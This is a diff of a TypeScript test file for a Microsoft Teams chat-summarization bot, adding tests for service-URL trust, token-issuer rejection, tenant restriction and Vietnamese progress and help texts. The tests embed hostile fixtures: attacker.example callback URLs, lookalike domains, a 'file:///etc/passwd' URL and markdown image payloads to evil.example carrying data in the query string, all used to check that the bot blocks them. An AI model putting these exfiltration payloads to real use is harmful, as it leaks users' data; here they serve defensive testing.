@@ -3,10 +3,12 @@ import { readConfig } from '../src/config.ts'
 import { createApiApp } from '../src/http/app.ts'
 import { createServices, type AppServices } from '../src/services.ts'
 import { createPrivateLogger, createTeamsBot, type TeamsBot, type TeamsBotOptions } from '../src/teams/bot.ts'
-import { extractPrompt, parseTeamsActivity, resolveTeamsSource, type TeamsActivityLike } from '../src/teams/context.ts'
 import {
-  BUSY_TEXT, INITIAL_PROGRESS, PLACEHOLDER_TEXT, createEditThrottle, finalText, personalHelpText, progressText, reduceProgress,
-  shortHelpText, truncateForTeams, type ProgressState,
+  extractPrompt, isEntraIssuedToken, isTrustedServiceUrl, parseTeamsActivity, resolveTeamsSource, type TeamsActivityLike,
+} from '../src/teams/context.ts'
+import {
+  BUSY_TEXT, FOREIGN_TENANT_TEXT, INITIAL_PROGRESS, PLACEHOLDER_TEXT, createEditThrottle, finalText, personalHelpText, progressText, reduceProgress,
+  shortHelpText, truncateForTeams, welcomeText, type ProgressState,
 } from '../src/teams/format.ts'
 import type { TranscriptStats } from '../src/types.ts'
 import type { WireEvent } from '../src/wire.ts'
@@ -22,7 +24,7 @@ function groupMessage(overrides: Partial<TeamsActivityLike> & Record<string, unk
     type: 'message',
     id: 'in-1',
     channelId: 'msteams',
-    serviceUrl: 'https://smba.test/teams/',
+    serviceUrl: 'https://smba.trafficmanager.net/teams/',
     text: '<at>MeoBeo</at> tóm tắt 3 ngày qua',
     from: { id: '29:user-an', name: 'An', aadObjectId: 'aad-an' },
     recipient: BOT,
@@ -121,45 +123,134 @@ describe('parseTeamsActivity', () => {
   })
 })
 
+describe('inbound trust', () => {
+  const jwt = (payload: object): string => `Bearer e30.${Buffer.from(JSON.stringify(payload)).toString('base64url')}.sig`
+
+  it('accepts only Microsoft Bot Framework service URLs (and loopback for local tools)', () => {
+    for (const url of [
+      'https://smba.trafficmanager.net/teams/', 'https://smba.trafficmanager.net/amer/', 'https://directline.botframework.com/',
+      'https://smba.infra.gcc.teams.microsoft.com/teams', 'http://localhost:56150', 'http://127.0.0.1:3978/',
+    ]) expect(isTrustedServiceUrl(url), url).toBe(true)
+    for (const url of [
+      undefined, '', 'not a url', 'https://attacker.example/collect/', 'http://smba.trafficmanager.net/teams/',
+      'https://smba.trafficmanager.net.attacker.example/', 'https://evilbotframework.com/', 'https://u:p@smba.trafficmanager.net/',
+      'https://teams.microsoft.com.attacker.example/', 'file:///etc/passwd',
+    ]) expect(isTrustedServiceUrl(url), String(url)).toBe(false)
+  })
+
+  it('recognizes Entra-issued tokens, which the bot never accepts', () => {
+    expect(isEntraIssuedToken(jwt({ iss: 'https://login.microsoftonline.com/tenant/v2.0', aud: 'app' }))).toBe(true)
+    expect(isEntraIssuedToken(jwt({ iss: 'https://sts.windows.net/tenant/' }))).toBe(true)
+    expect(isEntraIssuedToken(jwt({ iss: 'https://api.botframework.com' }))).toBe(false)
+    for (const header of [undefined, '', 'Bearer', 'Bearer a.b.c', 'Bearer x.%%%.y', jwt({})]) expect(isEntraIssuedToken(header)).toBe(false)
+  })
+})
+
 describe('progress text', () => {
   const stats: TranscriptStats = {
-    transcriptId: 't_1', messageCount: 340, participants: ['An', 'Bình'], since: '2026-10-01T00:00:00+07:00', until: '2026-10-06T11:00:00+07:00',
-    chunkCount: 8, truncated: false, clamped: false, notes: [],
+    transcriptId: 't_1', label: 'Tháng 10/2026 (đến hiện tại)', messageCount: 340, participants: ['An', 'Bình'],
+    since: '2026-10-01T00:00:00+07:00', until: '2026-10-06T11:00:00+07:00', chunkCount: 8, truncated: false, scanLimited: false, clamped: true, notes: [],
   }
+  const month = (id: string, month: number, messageCount: number): TranscriptStats => ({
+    ...stats,
+    transcriptId: id,
+    label: `Tháng ${month}/2026`,
+    messageCount,
+    since: `2026-${String(month).padStart(2, '0')}-01T00:00:00+07:00`,
+    until: `2026-${String(month + 1).padStart(2, '0')}-01T00:00:00+07:00`,
+    clamped: false,
+  })
 
-  function fold(events: readonly WireEvent[]): ProgressState {
-    return events.reduce(reduceProgress, INITIAL_PROGRESS)
+  function fold(events: readonly WireEvent[], from = INITIAL_PROGRESS): ProgressState {
+    return events.reduce(reduceProgress, from)
   }
 
   it('summarizes the turn so far on one line', () => {
     expect(progressText(INITIAL_PROGRESS, ZONE)).toBe(PLACEHOLDER_TEXT)
     expect(progressText(fold([{ t: 'fetch-progress', fetched: 150 }]), ZONE)).toBe('⏳ Đang đọc tin nhắn… (đã tải 150)')
     const state = fold([
-      { t: 'fetch-progress', fetched: 340 },
+      { t: 'tool-call', callId: 'l1', name: 'load_messages', input: { period: 'month', month: '2026-10' } },
+      { t: 'fetch-progress', fetched: 340, scannedBackTo: '2026-10-01T08:00:00+07:00' },
       { t: 'transcript', stats },
+      { t: 'tool-result', callId: 'l1', name: 'load_messages', status: 'completed', isError: false },
       { t: 'tool-call', callId: 'c1', name: 'summarize_messages', input: {} },
       { t: 'tool-call', callId: 'c2', name: 'extract_action_items', input: {} },
       { t: 'agent-progress', agent: 'summarizer', stage: 'map', done: 3, total: 8 },
       { t: 'agent-progress', agent: 'action-tracker', stage: 'map', done: 2, total: 8 },
     ])
-    expect(progressText(state, ZONE)).toBe('⏳ Đã đọc 340 tin nhắn (01/10 → 06/10) · Tóm tắt 3/8 phần · Việc cần làm 2/8 phần')
+    expect(progressText(state, ZONE)).toBe('⏳ Đã đọc 340 tin nhắn — Tháng 10/2026 (đến hiện tại) · Tóm tắt 3/8 phần · Việc cần làm 2/8 phần')
     const later = [
       { t: 'agent-progress', agent: 'summarizer', stage: 'reduce', done: 0, total: 1 },
       { t: 'tool-result', callId: 'c2', name: 'extract_action_items', status: 'completed', isError: false },
       { t: 'text-delta', text: 'Tóm', blockId: 'b1' },
     ] as const satisfies readonly WireEvent[]
-    expect(progressText(later.reduce(reduceProgress, state), ZONE))
-      .toBe('⏳ Đã đọc 340 tin nhắn (01/10 → 06/10) · Tóm tắt: đang tổng hợp · Việc cần làm ✓ · Đang viết câu trả lời…')
+    expect(progressText(fold(later, state), ZONE))
+      .toBe('⏳ Đã đọc 340 tin nhắn — Tháng 10/2026 (đến hiện tại) · Tóm tắt: đang tổng hợp · Việc cần làm ✓ · Đang viết câu trả lời…')
   })
 
-  it('shows an exclusive midnight end as the previous day, and a single day once', () => {
-    const day = { ...stats, since: '2026-10-05T00:00:00+07:00', until: '2026-10-06T00:00:00+07:00', messageCount: 0 }
-    expect(progressText(fold([{ t: 'transcript', stats: day }]), ZONE)).toBe('⏳ Không có tin nhắn nào (05/10)')
+  it('shows how far back a channel scan has reached, in the reader\'s zone', () => {
+    const state = fold([{ t: 'fetch-progress', fetched: 12, scannedBackTo: '2026-08-19T23:30:00Z' }])
+    expect(progressText(state, ZONE)).toBe('⏳ Đang đọc tin nhắn… (đã tải 12 · đang quét tới 20/08)')
+    expect(progressText(fold([{ t: 'fetch-progress', fetched: 0, scannedBackTo: 'không phải ngày' }]), ZONE)).toBe('⏳ Đang đọc tin nhắn… (đã tải 0)')
+  })
+
+  it('lists the segments of a split period: done ones with their count, running ones with their scan', () => {
+    const loads = ['l7', 'l8', 'l9'].map(callId => ({ t: 'tool-call', callId, name: 'load_messages', input: {} }) as const)
+    const state = fold([
+      ...loads,
+      { t: 'fetch-progress', fetched: 100, scannedBackTo: '2026-09-20T10:00:00+07:00', segment: 'Tháng 9/2026' },
+      { t: 'fetch-progress', fetched: 50, scannedBackTo: '2026-09-25T10:00:00+07:00', segment: 'Tháng 8/2026' },
+      { t: 'fetch-progress', fetched: 340, segment: 'Tháng 7/2026' },
+      { t: 'fetch-progress', fetched: 180, scannedBackTo: '2026-09-01T00:00:00+07:00', segment: 'Tháng 9/2026' },
+      { t: 'transcript', stats: month('t9', 9, 180) },
+      { t: 'transcript', stats: month('t7', 7, 340) },
+    ])
+    expect(progressText(state, ZONE)).toBe(
+      '⏳ Tháng 7/2026 ✓ 340 tin · Tháng 9/2026 ✓ 180 tin · Đang đọc Tháng 8/2026… (đã tải 50 · đang quét tới 25/09) · Khoảng dài được đọc lần lượt từng phần nên sẽ lâu hơn',
+    )
+    // The first finished segment is already shown as a segment.
+    const first = fold([
+      { t: 'fetch-progress', fetched: 40, segment: 'Tháng 7/2026' },
+      { t: 'transcript', stats: month('t7', 7, 40) },
+    ])
+    expect(progressText(first, ZONE)).toBe('⏳ Tháng 7/2026 ✓ 40 tin')
+    // Parallel specialist calls (one per segment) are counted rather than mixed together.
+    const summarizing = fold([
+      { t: 'transcript', stats: month('t8', 8, 500) },
+      ...['s7', 's8', 's9'].map(callId => ({ t: 'tool-call', callId, name: 'summarize_messages', input: {} }) as const),
+      { t: 'agent-progress', agent: 'summarizer', stage: 'map', done: 1, total: 4 },
+      { t: 'tool-result', callId: 's8', name: 'summarize_messages', status: 'completed', isError: false },
+    ], state)
+    expect(progressText(summarizing, ZONE)).toBe('⏳ Tháng 7/2026 ✓ 340 tin · Tháng 8/2026 ✓ 500 tin · Tháng 9/2026 ✓ 180 tin · Tóm tắt: xong 1/3')
+    const finished = fold(['s7', 's9'].map(callId => ({ t: 'tool-result', callId, name: 'summarize_messages', status: 'completed', isError: false }) as const), summarizing)
+    expect(progressText(finished, ZONE)).toContain('Tóm tắt ✓')
+  })
+
+  it('sums up long splits, drops a failed read and keeps one entry per transcript', () => {
+    const year = Array.from({ length: 6 }, (_, index) => month(`m${index}`, index + 1, 10))
+    expect(progressText(fold(year.map(item => ({ t: 'transcript', stats: item }) as const)), ZONE)).toBe('⏳ Đã đọc 60 tin nhắn từ 6 khoảng')
+
+    const failed = fold([
+      { t: 'tool-call', callId: 'l1', name: 'load_messages', input: {} },
+      { t: 'fetch-progress', fetched: 50 },
+      { t: 'tool-result', callId: 'l1', name: 'load_messages', status: 'completed', isError: false },
+    ])
+    expect(failed.reading).toEqual([])
+    expect(progressText(failed, ZONE)).toBe(PLACEHOLDER_TEXT)
+
+    const again = fold([{ t: 'transcript', stats }, { t: 'transcript', stats }])
+    expect(again.transcripts).toHaveLength(1)
+  })
+
+  it('falls back to the window bounds when a label is missing; an exclusive midnight end shows the day before', () => {
+    const day = { ...stats, label: '', since: '2026-10-05T00:00:00+07:00', until: '2026-10-06T00:00:00+07:00', messageCount: 0 }
+    expect(progressText(fold([{ t: 'transcript', stats: day }]), ZONE)).toBe('⏳ Không có tin nhắn nào — 05/10')
   })
 
   it('ignores events that do not change the line', () => {
     const state = fold([{ t: 'transcript', stats }])
-    expect(reduceProgress(state, { t: 'tool-call', callId: 'x', name: 'load_messages', input: {} })).toBe(state)
+    expect(reduceProgress(state, { t: 'tool-call', callId: 'x', name: 'other_tool', input: {} })).toBe(state)
+    expect(reduceProgress(state, { t: 'tool-result', callId: 'x', name: 'summarize_messages', status: 'completed', isError: false })).toBe(state)
     expect(reduceProgress(state, { t: 'commentary', text: 'Đang xem…', blockId: 'b' })).toBe(state)
   })
 })
@@ -202,26 +293,73 @@ describe('reply size', () => {
     expect(bytes(capped)).toBeLessThanOrEqual(1_000)
   })
 
+  const read = (overrides: Partial<TranscriptStats> = {}): TranscriptStats => ({
+    transcriptId: 't', label: '2 ngày qua (05/10/2026 00:00 → 06/10/2026 10:00)', messageCount: 12, participants: [],
+    since: '2026-10-05T00:00:00+07:00', until: '2026-10-06T10:00:00+07:00', chunkCount: 1, truncated: false, scanLimited: false, clamped: false, notes: [],
+    ...overrides,
+  })
+
   it('adds what was read under the final answer, within the cap', () => {
-    const stats = { transcriptId: 't', messageCount: 12, participants: [], since: '2026-10-05T00:00:00+07:00', until: '2026-10-06T10:00:00+07:00', chunkCount: 1, truncated: true, clamped: false, notes: [] }
-    const text = finalText('**Tóm tắt**', stats, ZONE)
+    const cut = read({ truncated: true })
+    const text = finalText('**Tóm tắt**', [cut], ZONE)
     expect(text).toContain('**Tóm tắt**')
-    expect(text).toContain('Dựa trên 12 tin nhắn (05/10 → 06/10)')
-    expect(text).toContain('chưa đọc hết')
-    expect(bytes(finalText('ạ'.repeat(30_000), stats, ZONE))).toBeLessThanOrEqual(24_000)
+    expect(text).toContain('_Dựa trên 12 tin nhắn — 2 ngày qua (05/10/2026 00:00 → 06/10/2026 10:00); chưa đọc hết khoảng thời gian vì quá nhiều tin nhắn._')
+    expect(bytes(finalText('ạ'.repeat(30_000), [cut], ZONE))).toBeLessThanOrEqual(24_000)
+    expect(finalText('Không có gì.', [read({ messageCount: 0 })], ZONE)).toBe('Không có gì.')
+    expect(finalText('Xin chào', [], ZONE)).toBe('Xin chào')
+    expect(finalText('A', [read({ truncated: true, scanLimited: true })], ZONE))
+      .toContain('; chưa quét tới đầu khoảng thời gian (chạm giới hạn quét)._')
+  })
+
+  it('never lets an injected image load when the reply is shown', () => {
+    const answer = 'Xem ![sơ đồ](https://evil.example/p.png?d=bí-mật) và ![][r] <img src="https://evil.example/a.png"> <IMG/src=x> <svg onload=x>\n[r]: https://evil.example/r.png\n[tài liệu](https://docs.example/x)'
+    const text = finalText(answer, [], ZONE)
+    expect(text).not.toMatch(/!\[|<img|<svg/i)
+    expect(text).toContain('[sơ đồ](https://evil.example/p.png?d=bí-mật)')
+    expect(text).toContain('[tài liệu](https://docs.example/x)')
+  })
+
+  it('sums the segments of a split period in date order and names the incomplete ones', () => {
+    const month = (id: string, m: number, messageCount: number, extra: Partial<TranscriptStats> = {}) => read({
+      transcriptId: id, label: `Tháng ${m}/2026`, messageCount, since: `2026-0${m}-01T00:00:00+07:00`, until: `2026-0${m + 1}-01T00:00:00+07:00`, ...extra,
+    })
+    const quarter = [month('t9', 9, 180), month('t7', 7, 340, { truncated: true, scanLimited: true }), month('t8', 8, 500)]
+    expect(finalText('Quý 3', quarter, ZONE)).toBe(
+      'Quý 3\n\n_Dựa trên 1020 tin nhắn — Tháng 7/2026: 340 · Tháng 8/2026: 500 · Tháng 9/2026: 180; chưa quét tới đầu Tháng 7/2026 (chạm giới hạn quét)._',
+    )
+    const half = [3, 4, 5, 6, 7, 8].map(m => month(`h${m}`, m, 10))
+    expect(finalText('Nửa năm', half, ZONE)).toContain('_Dựa trên 60 tin nhắn — 6 khoảng, Tháng 3/2026 → Tháng 8/2026._')
   })
 })
 
 describe('help texts', () => {
-  it('explains how to use the bot, the limit and the web app', () => {
-    const text = personalHelpText({ botName: 'MeoBeo', maxLookbackDays: 30, webUrl: 'https://meobeo.example.com' })
-    expect(text).toContain('@MeoBeo tóm tắt 3 ngày qua')
-    expect(text).toContain('@MeoBeo hôm qua có quyết định gì?')
-    expect(text).toContain('@MeoBeo ai đang phụ trách việc deploy?')
-    expect(text).toContain('30 ngày')
+  const limits = { maxRangeDays: 31, maxPeriodDays: 92 }
+
+  it('explains how to use the bot, what can be read and the web app', () => {
+    const text = personalHelpText({ botName: 'MeoBeo', ...limits, webUrl: 'https://meobeo.example.com' })
+    for (const example of ['tóm tắt 3 ngày qua', 'tóm tắt ngày 6/9', 'tuần thứ 2 tháng 8 có quyết định gì?', 'tóm tắt quý 3', 'ai đang phụ trách việc deploy?']) {
+      expect(text).toContain(`\`@MeoBeo ${example}\``)
+    }
+    expect(text).toContain('bất kỳ ngày, tuần hay tháng nào trong quá khứ')
+    expect(text).toContain('6/9 là ngày 6 tháng 9')
+    expect(text).toContain('Mỗi lần đọc tối đa 31 ngày; khoảng dài hơn (tối đa 92 ngày) được chia theo từng tháng')
+    expect(text).toContain('không lưu lại nội dung')
+    expect(text).not.toMatch(/30 ngày|gần nhất/u)
     expect(text).toContain('https://meobeo.example.com')
-    expect(personalHelpText({ botName: 'MeoBeo', maxLookbackDays: 30 })).not.toContain('http')
-    expect(shortHelpText({ botName: 'Mèo', maxLookbackDays: 7 })).toContain('@Mèo tóm tắt 24 giờ qua')
+    expect(personalHelpText({ botName: 'MeoBeo', ...limits })).not.toContain('http')
+  })
+
+  it('adapts the examples and rules to the configured limits', () => {
+    const short = shortHelpText({ botName: 'Mèo', maxRangeDays: 7, maxPeriodDays: 7 })
+    expect(short).toContain('@Mèo tóm tắt 24 giờ qua')
+    expect(short).toContain('@Mèo tóm tắt ngày 6/9')
+    expect(short).toContain('Mỗi lần đọc tối đa 7 ngày.')
+    expect(short).not.toContain('quý 3')
+    expect(short).not.toContain('chia theo')
+    const welcome = welcomeText({ botName: 'MeoBeo', ...limits })
+    expect(welcome).toContain('Chào mọi người')
+    expect(welcome).toContain('@MeoBeo tuần thứ 2 tháng 8 có quyết định gì?')
+    expect(welcome).toContain('tối đa 92 ngày')
   })
 })
 
@@ -327,7 +465,7 @@ describe('Teams bot end to end', () => {
     expect(response.status).toBe(200)
     await bot.idle()
 
-    const conversationUrl = 'https://smba.test/teams/v3/conversations/19:group@thread.v2/activities'
+    const conversationUrl = 'https://smba.trafficmanager.net/teams/v3/conversations/19:group@thread.v2/activities'
     expect(calls[0]).toMatchObject({ method: 'POST', url: conversationUrl, data: { type: 'typing' } })
     const posted = calls.filter(call => call.method === 'POST' && call.data?.type === 'message')
     expect(posted).toHaveLength(1)
@@ -361,9 +499,9 @@ describe('Teams bot end to end', () => {
     const { bot, calls, graph } = await botHarness()
     await bot.handle({ body: channelMessage({ id: '19:team@thread.tacv2', name: 'Kỹ thuật' }), headers: {} })
     await bot.idle()
-    expect(calls.some(call => call.method === 'GET' && call.url === 'https://smba.test/teams/v3/teams/19:team@thread.tacv2')).toBe(true)
+    expect(calls.some(call => call.method === 'GET' && call.url === 'https://smba.trafficmanager.net/teams/v3/teams/19:team@thread.tacv2')).toBe(true)
     expect(graph.paths()[0]).toBe(`/teams/${TEAM_GUID}/channels/19:chan@thread.tacv2/messages`)
-    const threadUrl = 'https://smba.test/teams/v3/conversations/19:chan@thread.tacv2;messageid=1700000000000/activities'
+    const threadUrl = 'https://smba.trafficmanager.net/teams/v3/conversations/19:chan@thread.tacv2;messageid=1700000000000/activities'
     expect(messagesPosted(calls).every(call => call.url.startsWith(threadUrl))).toBe(true)
   })
 
@@ -402,6 +540,46 @@ describe('Teams bot end to end', () => {
     })
     await bot.idle()
     expect(messagesPosted(calls).map(call => call.data?.text)).toEqual([expect.stringContaining('Chào mọi người')])
+  })
+
+  it('refuses Entra-issued tokens (e.g. a web user\'s ID token) before the SDK sees them', async () => {
+    const appId = '11111111-2222-3333-4444-555555555555'
+    const tenant = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee'
+    const base = await createServices({ config: readConfig({ LLM_PROVIDER: 'mock', CLIENT_ID: appId, CLIENT_SECRET: 's', TENANT_ID: tenant }) })
+    const { calls, client } = fakeConnector()
+    const bot = await createTeamsBot(base, { client, dangerouslyAllowUnauthenticatedRequests: false, logger: silentLogger })
+    cleanups.push(async () => { await bot.close(); await base.close() })
+    const claims = { iss: `https://login.microsoftonline.com/${tenant}/v2.0`, aud: appId, tid: tenant }
+    const token = `e30.${Buffer.from(JSON.stringify(claims)).toString('base64url')}.sig`
+    const response = await bot.handle({
+      body: groupMessage({ serviceUrl: 'https://attacker.example/collect/', channelData: { tenant: { id: tenant } } }),
+      headers: { authorization: `Bearer ${token}` },
+    })
+    expect(response).toEqual({ status: 401, body: { error: 'Unsupported token issuer' } })
+    await bot.idle()
+    expect(calls).toEqual([])
+  })
+
+  it('never replies to a serviceUrl outside Microsoft, and reads nothing for it', async () => {
+    const { bot, calls, graph } = await botHarness()
+    await bot.handle({ body: groupMessage({ serviceUrl: 'https://attacker.example/collect/' }), headers: {} })
+    await bot.handle({ body: { ...groupMessage({ serviceUrl: 'https://attacker.example/' }), type: 'installationUpdate', action: 'add' }, headers: {} })
+    await bot.idle()
+    expect(calls).toEqual([])
+    expect(graph.requests).toEqual([])
+  })
+
+  it('reads only the configured tenant when TENANT_ID is a tenant GUID', async () => {
+    const tenant = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee'
+    const { bot, calls, graph, tokens } = await botHarness({ LLM_PROVIDER: 'mock', TENANT_ID: tenant })
+    await bot.handle({ body: groupMessage(), headers: {} })
+    await bot.idle()
+    expect(messagesPosted(calls).map(call => call.data?.text)).toEqual([`⚠️ ${FOREIGN_TENANT_TEXT}`])
+    expect(graph.requests).toEqual([])
+    await bot.handle({ body: groupMessage({ id: 'in-2', channelData: { tenant: { id: tenant.toUpperCase() } } }), headers: {} })
+    await bot.idle()
+    expect(tokens).toEqual([tenant.toUpperCase()])
+    expect(graph.paths()).toEqual(['/chats/19:group@thread.v2/messages'])
   })
 
   it('serves POST /api/messages through the Hono app', async () => {
